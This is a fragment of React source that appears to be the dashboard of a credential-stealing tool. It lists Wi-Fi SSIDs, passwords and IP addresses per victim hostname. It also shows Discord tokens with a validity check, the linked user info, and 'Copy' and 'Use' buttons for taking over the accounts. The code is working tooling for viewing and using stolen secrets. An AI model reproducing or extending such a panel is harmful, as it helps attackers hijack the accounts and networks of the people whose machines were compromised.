  return <tr><td>{formatDate(row.created_at)}</td><td>{displayHost(row.hostname, aliases)}</td><td>{row.ssid}</td><td><button className="btn" style={{ padding: '6px 10px' }} onClick={() => setRevealed(!revealed)}>{row.password ? (revealed ? row.password : mask(row.password)) : '(open)'}</button></td><td><span className="badge">{row.security}</span></td><td className="mono">{row.ipv4}</td></tr>;
}

function DiscordTokenRow({ row, aliases, setDiscordToken, pushToast }) {
  const [revealed, setRevealed] = useState(false);
  const masked = row.token?.length > 20 ? `${row.token.slice(0, 10)}${'•'.repeat(18)}${row.token.slice(-5)}` : mask(row.token || '');
  return <tr><td>{formatDate(row.created_at)}</td><td>{displayHost(row.hostname, aliases)}</td><td className="mono"><button className="btn" style={{ padding: '6px 10px', marginRight: 8 }} onClick={() => setRevealed(!revealed)}>{revealed ? row.token : masked}</button>{row.valid ? <span className="badge" style={{ color: 'var(--green)' }}>{row.userInfo || 'Valid'}</span> : <span className="badge" style={{ color: 'var(--red)' }}>Invalid</span>}</td><td>{row.valid && <><button className="btn" style={{ padding: '6px 10px', marginRight: 8 }} onClick={async () => { await navigator.clipboard.writeText(row.token || ''); pushToast('Token copied', 'success'); }}>Copy</button><button className="btn purple" onClick={() => { setDiscordToken(row.token); pushToast('Selected this token', 'success'); }}>Use</button></>}</td></tr>;
}

export default App;
